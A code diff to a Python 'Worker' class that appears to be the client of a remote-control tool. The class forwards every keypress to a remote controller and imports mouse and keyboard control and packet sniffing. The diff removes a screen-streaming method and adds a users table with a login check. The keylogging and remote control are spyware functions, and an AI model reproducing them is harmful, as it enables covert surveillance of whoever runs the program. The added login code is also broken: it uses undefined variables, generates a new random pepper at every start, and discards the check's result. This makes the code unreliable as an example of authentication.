@@ -1,6 +1,6 @@
+import base64
 import json
 import socket
-import sys
 import threading
 import time
 from typing import Callable
@@ -16,14 +16,15 @@ import hmac
 import cv2
 import numpy as np
 import pyautogui
-from pynput.keyboard import Controller , Listener, Key
-from pynput.mouse import Button,Controller
+from pynput.keyboard import Listener, Key
+from pynput.mouse import Button
 from scapy.all import sniff
 from scapy.utils import wrpcap
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 import mss
-global STREAM
+from mysql.engine import Engine
+from mysql.query import *
 special_keys = {
     "enter": Key.enter,
     "esc": Key.esc,
@@ -165,21 +166,20 @@ class Worker:
         self.peer_master_key = None
         self._sock_lock = threading.RLock()
         self.key_listener = Listener(on_press=self.on_press)
+        self.engine = Engine().open("users.db")
+        self.name = Field("name",str,primary=True)
+        admin = Field("admin",bool,nullable=True)
+        password = Field("password",str)
+        self.users_table = Table("users",(name,password,admin))
+        create = Create(self.users_table,exists_ok=True)
+        self.engine.execute(create)
+        self.pepper = os.urandom(32)
+
+
 
     def on_press(self,key):
         with self._sock_lock:
             self.sender(f"{key} was pressed".encode())
-
-    def live_stream(self):
-        global STREAM
-        while True:
-            if STREAM:
-                with mss.mss() as sct:
-                    monitor = sct.monitors[1]
-                    frame = np.array(sct.grab(monitor))
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-                    encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
-                    self.sender(buffer.tobytes(),stream=True)
 
     def listen_to_keys(self):
         if not self.key_listener.running:
@@ -290,6 +290,21 @@ class Worker:
             data += packet
         return data
 
+    def login(self,command:str):
+        s = command.split(":")
+        user = s[0]
+        password = s[1]
+        hash_fn_name, salt, hashed_password = self.read_user(user).split("$")
+        h = hashlib.sha256(self.pepper + base64.b64decode(salt) + password.encode()).digest()
+        return hashed_password == base64.b64encode(h).decode()
+
+    def read_user(self,user: str) -> str:
+        select = Select(self.users_table)
+        for t in self.engine.execute(select):
+            if t["name"] == user:
+                return t["password"]
+        raise Exception("user not found, try searching for a different one")
+
 
     def run(self):
         self.connect()
@@ -314,6 +329,10 @@ class Worker:
                 self.stop_listen_to_keys()
                 self.sender(b"stopped_listening")
                 continue
+            if name == "login":
+                self.login(commend.decode())
+                continue
+
             message = self.functions[name](commend)
             if name not in ["control_mouse", "press_key_in_worker", "live_stream", "stop_stream", "listen_to_keys", "stop_listen_to_keys"]:
                 with self._sock_lock:
